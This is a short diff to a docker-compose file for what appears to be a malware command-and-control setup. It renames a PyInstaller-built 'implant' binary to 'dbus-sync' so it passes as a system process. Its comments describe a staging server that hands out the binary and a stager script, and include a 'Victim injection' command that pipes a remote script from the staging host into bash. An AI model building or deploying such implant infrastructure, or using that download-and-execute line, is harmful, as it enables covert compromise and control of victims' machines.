@@ -7,10 +7,10 @@ version: "3.9"
 #   docker compose up --build
 #
 # Pre-requisite: build the implant binary once in WSL/Linux:
-#   pyinstaller --onefile --noupx --name dbus-daemon \
+#   pyinstaller --onefile --noupx --name dbus-sync \
 #       --hidden-import ssl --hidden-import _ssl --collect-all cryptography \
 #       implant_client.py
-#   cp dist/dbus-daemon staging/dbus-daemon
+#   cp dist/dbus-sync staging/dbus-sync
 #   cp stager.sh staging/stager.sh
 
 x-token: &token ${OPERATOR_TOKEN:-changeme}
@@ -67,7 +67,7 @@ services:
     restart: unless-stopped
 
   # HTTPS staging server - serves pre-built binary + stager on :8443
-  # /s = stager.sh with STAGING_HOST substituted, /b = dbus-daemon binary
+  # /s = stager.sh with STAGING_HOST substituted, /b = dbus-sync binary
   # Victim injection: curl -fsSLk https://<STAGING_HOST>:8443/s | bash
   staging-server:
     build:
